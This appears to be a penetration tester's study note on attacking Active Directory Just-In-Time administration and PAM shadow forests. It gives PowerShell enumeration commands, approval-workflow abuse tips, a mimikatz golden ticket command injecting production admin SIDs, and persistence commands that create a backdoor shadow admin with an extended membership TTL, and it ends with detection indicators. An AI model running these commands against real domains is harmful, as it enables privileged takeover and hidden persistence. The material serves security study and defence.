---
tags:
  - Active_Directory
  - Foundational
  - Windows
---

## Just-In-Time Administration Theory
resources: [Microsoft PAM Documentation](https://learn.microsoft.com/en-us/microsoft-identity-manager/pam/privileged-identity-management-for-active-directory-domain-services)

> [!info] **JIT** provides time-limited privileged access. Users request access, receive temporary group membership, access expires automatically.

### JIT Components
> - **PAM Trust** - Shadow forest for managing privileged access
> - **Shadow Principals** - Mirrored accounts in PAM forest
> - **Time-Based Groups** - Membership expires after set duration
> - **Request Workflow** - Approval process for access

### How JIT Works
> [!tip] JIT workflow:
> 1. User requests privileged access
> 2. Request is approved (manual or automatic)
> 3. User added to shadow group with TTL
> 4. User accesses resources using shadow principal
> 5. After TTL expires, membership removed

## Enumerating JIT

### Find PAM Trust [Remote]
```powershell
Get-ADTrust -Filter { ForestTransitive -eq $true }
```

### Identify Shadow Forest [Remote]

```powershell
# Look for trusts to priv.domain.local or similar
Get-ADForest | Select-Object -ExpandProperty Domains
```

### Find Shadow Principals [Remote]
```powershell
Get-ADObject -Filter { objectClass -eq "foreignSecurityPrincipal" } -Server <PAMForest>
```

### Check Group Membership TTL [Remote]
```powershell
Get-ADGroup "Shadow Admins" -Properties member, msDS-MembersOfResourceProperty -Server <PAMForest>
```

## Exploiting JIT

### Request Elevation [Remote]
```powershell
# If eligible for JIT
Request-PAMRoleActivation -RoleId <RoleGUID>
```

### Check Current JIT Sessions [Remote]
```powershell
Get-PAMRoleAssignment | Where-Object { $_.Status -eq "Active" }
```

### Extend Session Duration
> [!tip] If can modify PAM policies, increase TTL for persistent access.

### Abuse Approval Workflow
> [!tip] Potential attack vectors:
> - Compromise approver account
> - Approve your own requests
> - Request access when approver is away

## Attacking PAM Infrastructure

### Target PAM Forest
> [!danger] PAM forest DC is high-value target. Compromise provides access to all shadow principals.

### SID History Attack
> [!warning] If PAM trust allows SID filtering bypass, inject SID history to shadow principal.

### Golden Ticket in PAM Forest [Remote]
```cmd
mimikatz.exe
kerberos::golden /user:Administrator /domain:<PAMDomain> /sid:<PAMDomainSID> /krbtgt:<PAMKrbtgt> /sids:<ProductionAdminSID> /ptt
```

## Persistence Through JIT

### Create Backdoor Shadow Principal [Remote]
```powershell
# In PAM forest with admin rights
New-ADUser -Name "BackdoorShadow" -SamAccountName "backdoor" -Server <PAMForest>
Add-ADGroupMember -Identity "Shadow Admins" -Members "backdoor" -Server <PAMForest>
```

### Modify TTL Settings [Remote]
```powershell
# Extend membership duration
Set-ADGroup "Shadow Admins" -Replace @{'msDS-MembershipTTL'='999999'} -Server <PAMForest>
```

## Detection and Logging

### JIT Event Logs
> [!info] Event sources:
> - MIM PAM logs
> - Security event 4728 (member added to group)
> - Security event 4729 (member removed from group)

### Monitor for Anomalies
> [!info] Detection indicators:
> - Requests outside business hours
> - Frequent re-requests
> - Long TTL requests
> - Requests from unusual locations
